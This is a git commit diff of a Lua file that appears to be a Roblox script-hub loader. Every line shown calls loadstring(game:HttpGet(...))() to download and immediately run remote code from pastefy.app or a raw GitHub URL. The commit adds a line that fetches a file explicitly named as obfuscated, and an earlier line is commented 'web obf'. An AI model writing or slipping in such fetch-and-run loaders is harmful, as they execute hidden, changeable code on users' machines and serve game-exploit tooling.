0a629899de115ef444073fcd00d14f12c53f716c
Dev-AuraHub <anitagonzalezdavis750519@gmail.com>
2026-06-30 15:30:32 +0700

    Update 102106117195573.lua

--- 102106117195573.lua
+++ 102106117195573.lua
@@ -2,3 +2,5 @@
 loadstring(game:HttpGet('https://pastefy.app/JVk4bYLW/raw'))()
 --web obf
 loadstring(game:HttpGet('https://pastefy.app/rt6EonmR/raw'))()
+--thành ngáo
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Pthanhdepzai/sever/refs/heads/main/message%20(8)-obfuscated.lua"))()
